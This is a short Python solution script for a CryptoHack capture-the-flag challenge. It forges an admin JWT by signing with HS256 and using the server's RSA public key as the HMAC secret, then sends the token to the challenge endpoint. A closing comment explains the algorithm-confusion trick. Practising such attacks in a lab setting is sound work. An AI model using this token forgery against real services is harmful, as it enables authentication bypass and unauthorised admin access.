import requests
import json
import jwt_patched as jwt

# Reference: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

# Challenge endpoint
URL = "http://web.cryptohack.org/rsa-or-hmac/"

def get_auth_route(token):
    return URL + f"authorise/{token}/"

def get_pub_key():
    url = URL + "get_pubkey/"
    return json.loads(requests.get(url).content.decode("utf-8"))

# Retrieve RSA public key
pub_key = get_pub_key()["pubkey"]

# Craft evil token with patched PyJWT library
evil_token = jwt.encode({"username": "user", "admin": True}, pub_key, algorithm="HS256")
print("Evil token", evil_token)

r = requests.get(get_auth_route(evil_token))
print(r.content.decode("utf-8"))

#solution
#This script demonstrates a JWT vulnerability by using an RSA public key in an unintended way to create a malicious token. 
#It retrieves the public key and uses the PyJWT library to encode a token, but signs it with the HS256 algorithm, instead of using the correct RSA signature. 
#The token is then sent to the authorization endpoint, attempting to bypass the security by impersonating an admin.
